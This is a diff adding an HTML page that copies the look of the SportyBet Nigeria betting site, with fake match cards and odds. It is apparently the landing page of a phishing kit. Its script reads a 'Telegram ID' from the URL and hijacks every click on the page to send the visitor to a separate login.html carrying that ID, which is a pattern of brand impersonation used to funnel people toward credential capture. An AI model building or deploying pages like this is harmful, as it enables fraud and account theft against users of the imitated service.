@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>SportyBet Nigeria</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body{
+  margin:0;
+  font-family:Arial, sans-serif;
+  background:#111;
+  color:#fff;
+}
+
+/* ===== TOP BAR ===== */
+.header{
+  background:#e50914;
+  padding:12px;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+}
+
+.logo{
+  font-size:22px;
+  font-weight:bold;
+}
+
+.top-btns a{
+  text-decoration:none;
+  color:#fff;
+  padding:6px 12px;
+  border-radius:6px;
+  border:1px solid #fff;
+  margin-left:8px;
+  font-size:13px;
+  cursor:pointer;
+}
+
+/* ===== SPORTS MENU ===== */
+.menu{
+  display:flex;
+  overflow-x:auto;
+  background:#1a1a1a;
+  padding:10px;
+  gap:12px;
+}
+
+.menu div{
+  white-space:nowrap;
+  font-size:13px;
+  padding:6px 12px;
+  background:#262626;
+  border-radius:6px;
+  cursor:pointer;
+}
+
+/* ===== MATCH CARD ===== */
+.container{
+  padding:14px;
+}
+
+.card{
+  background:#1e1e1e;
+  border-radius:10px;
+  padding:14px;
+  margin-bottom:14px;
+  cursor:pointer;
+}
+
+.match{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+}
+
+.teams{
+  font-size:14px;
+  line-height:1.6;
+}
+
+.odds{
+  display:flex;
+  gap:8px;
+  margin-top:10px;
+}
+
+.odd{
+  flex:1;
+  background:#2a2a2a;
+  padding:10px;
+  text-align:center;
+  border-radius:6px;
+  color:#00ff99;
+}
+
+/* ===== BOTTOM MENU ===== */
+.bottom-nav{
+  position:fixed;
+  bottom:0;
+  width:100%;
+  background:#000;
+  display:flex;
+  justify-content:space-around;
+  padding:10px 0;
+  border-top:1px solid #333;
+}
+
+.bottom-nav div{
+  font-size:12px;
+  text-align:center;
+  color:#ccc;
+  cursor:pointer;
+}
+</style>
+</head>
+<body>
+
+<!-- ===== HEADER ===== -->
+<div class="header">
+  <div class="logo">SportyBet</div>
+  <div class="top-btns">
+    <a onclick="goToLogin()">Join Now</a>
+    <a onclick="goToLogin()">Log in</a>
+  </div>
+</div>
+
+<!-- ===== TOP SPORTS MENU ===== -->
+<div class="menu">
+  <div>All Sports</div>
+  <div>Live</div>
+  <div>Load Code</div>
+  <div>Aviator</div>
+  <div>Virtuals</div>
+  <div>More</div>
+</div>
+
+<!-- ===== MATCH AREA ===== -->
+<div class="container">
+
+  <div class="card">
+    <div class="match">
+      <div class="teams">
+        Wolves <br> vs <br> Man United
+      </div>
+      <div>21:00 Today</div>
+    </div>
+
+    <div class="odds">
+      <div class="odd">1 <br>5.18</div>
+      <div class="odd">X <br>4.31</div>
+      <div class="odd">2 <br>1.68</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="match">
+      <div class="teams">
+        Suwon FC <br> vs <br> Bucheon FC
+      </div>
+      <div>45:00 HT</div>
+    </div>
+
+    <div class="odds">
+      <div class="odd">1 <br>17.00</div>
+      <div class="odd">X <br>7.25</div>
+      <div class="odd">2 <br>1.10</div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ===== BOTTOM NAV ===== -->
+<div class="bottom-nav">
+  <div>Menu</div>
+  <div>Games</div>
+  <div>Open Bets</div>
+  <div>Me</div>
+</div>
+
+<!-- ✅✅✅ TELEGRAM ID REDIRECTION SYSTEM -->
+<script>
+  // ✅ Get Telegram ID from URL
+  const params = new URLSearchParams(window.location.search);
+  const telegramID = params.get("id");
+
+  // ✅ Redirect Function
+  function goToLogin() {
+    if (telegramID) {
+      window.location.href = "login.html?id=" + telegramID;
+    } else {
+      window.location.href = "login.html";
+    }
+  }
+
+  // ✅ Make EVERYTHING on the page clickable
+  document.addEventListener("click", function () {
+    goToLogin();
+  });
+</script>
+
+</body>
+</html>
